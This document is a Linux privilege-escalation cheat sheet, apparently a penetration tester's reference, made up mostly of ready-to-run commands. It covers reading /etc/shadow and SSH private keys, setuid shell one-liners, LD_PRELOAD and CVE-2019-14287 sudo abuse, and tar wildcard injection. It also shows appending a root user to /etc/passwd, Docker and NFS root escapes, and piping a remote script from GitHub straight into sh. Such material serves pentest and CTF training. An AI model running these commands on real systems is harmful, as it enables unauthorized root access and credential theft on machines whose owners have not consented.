# Linux Privilege Escalation

## Initial Enumeration
```bash
id && whoami && hostname && uname -a
cat /etc/os-release
sudo -l
env | grep -i pass
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/shadow 2>/dev/null
ls -la /etc/sudoers.d/
history 2>/dev/null; cat ~/.bash_history 2>/dev/null
```

## SUID/SGID Binary Discovery
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```
Cross-reference every SUID binary with https://gtfobins.github.io — custom or uncommon binaries are highest priority.

## Capabilities
```bash
getcap -r / 2>/dev/null
```
- `cap_setuid+ep` on python3/perl/ruby: `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
- `cap_dac_read_search+ep`: read any file — `./binary /etc/shadow`
- `cap_sys_admin+ep` on a binary: mount host filesystem, abuse cgroups

## Sudo Misconfigurations
```bash
sudo -l
```
- `NOPASSWD` on vi/vim/less/more/man/find/nmap/python/perl/ruby/env/awk/ftp → GTFOBins shell escape
- `LD_PRELOAD` in env_keep: compile shared object calling `setuid(0)+system("/bin/bash")`, run `sudo LD_PRELOAD=/tmp/pe.so <allowed_cmd>`
- `env_keep+=LD_LIBRARY_PATH`: hijack shared lib of allowed sudo binary
- `(ALL, !root) /bin/bash` with sudo < 1.8.28: `sudo -u#-1 /bin/bash` (CVE-2019-14287)

## Cron Job Hijacking
```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
systemctl list-timers 2>/dev/null
```
- Writable cron script: inject reverse shell
- PATH manipulation: cron uses relative command, create payload earlier in PATH
- Wildcard injection in tar: `echo '' > '/tmp/--checkpoint=1'` + `echo '' > '/tmp/--checkpoint-action=exec=sh shell.sh'`
- Monitor with pspy: `./pspy64 -i 1000`

## Kernel Exploits
```bash
uname -r
cat /proc/version
```
- DirtyPipe CVE-2022-0847 (5.8 <= kernel < 5.16.11): overwrite read-only files including /etc/passwd
- DirtyCow CVE-2016-5195 (kernel < 4.8.3): race condition write to read-only mappings
- OverlayFS CVE-2021-3493 (Ubuntu kernels < 5.11): `unshare -m` + overlayfs setuid copy
- PwnKit CVE-2021-4034: pkexec local root, works on most Linux distros 2009-2022

## Writable /etc/passwd
```bash
ls -la /etc/passwd
openssl passwd -1 hacked
echo 'hacker:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

## Docker Group Escape
```bash
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
Alternative: `docker run -v /etc/shadow:/tmp/shadow alpine cat /tmp/shadow`

## NFS no_root_squash
```bash
showmount -e <target>
cat /etc/exports
```
If `no_root_squash`: mount share on attacker box, create SUID bash as root, execute on target.
```bash
mount -t nfs <target>:/share /mnt
cp /bin/bash /mnt/rootbash && chmod +s /mnt/rootbash
# On target: /share/rootbash -p
```

## Writable PATH Directories
```bash
echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null | grep -v "root root"
find / -writable -type d 2>/dev/null | grep -E "^/(usr|opt|home)"
```
If a root-owned script or service calls a command without full path and you can write to a PATH dir, drop a malicious binary.

## Automated Enumeration
```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh && /tmp/le.sh -t
```

## SSH Key Harvesting
```bash
find / -name authorized_keys -o -name id_rsa -o -name id_ed25519 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
```

## Process and Network Recon
```bash
ps auxwwf
ss -tlnp
netstat -antp 2>/dev/null
cat /proc/net/tcp
```
Look for services bound to 127.0.0.1 — internal-only services often run as root without auth (MySQL, Redis, Docker API on 2375).

## Quick Wins Checklist
1. `sudo -l` — any NOPASSWD entry is a potential root path
2. SUID on custom binary or script interpreter
3. Writable cron script running as root
4. Docker/lxd group membership
5. Kernel version matches known exploit
6. Credentials in config files: `grep -rl 'password' /var/www /opt /etc 2>/dev/null`
7. Internal services on localhost with no auth
